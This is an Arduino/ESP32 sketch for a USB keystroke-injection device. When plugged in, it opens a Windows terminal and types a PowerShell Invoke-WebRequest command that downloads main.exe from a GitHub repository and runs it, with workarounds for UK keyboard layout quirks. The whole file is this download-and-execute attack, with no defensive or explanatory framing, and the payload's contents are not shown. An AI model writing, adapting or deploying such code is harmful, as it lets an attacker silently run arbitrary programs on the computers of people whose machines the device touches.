#include <USB.h>
#include <USBHIDKeyboard.h>

USBHIDKeyboard Keyboard;

void setup() {
  USB.begin();
  Keyboard.begin();

  delay(5000);

  Keyboard.press(KEY_LEFT_GUI);
  delay(100);
  Keyboard.releaseAll();
  delay(800);

  Keyboard.print("Terminal");
  delay(500);
  Keyboard.write(KEY_RETURN);
  delay(1050);

  String rawUrl = "https://github.com/skykosiner/charlie-kirk/raw/refs/heads/master/dist/main.exe";
  // @ become '"' on a UK layout
  Keyboard.print("Invoke-WebRequest @");
  Keyboard.print(rawUrl);
  Keyboard.print("@ -OutFile main.exe; ");

  // Uk keycode for '\'
  Keyboard.write('.');
  Keyboard.pressRaw(0x64);
  Keyboard.releaseRaw(0x64);

  Keyboard.println("main.exe");
}

void loop() {}
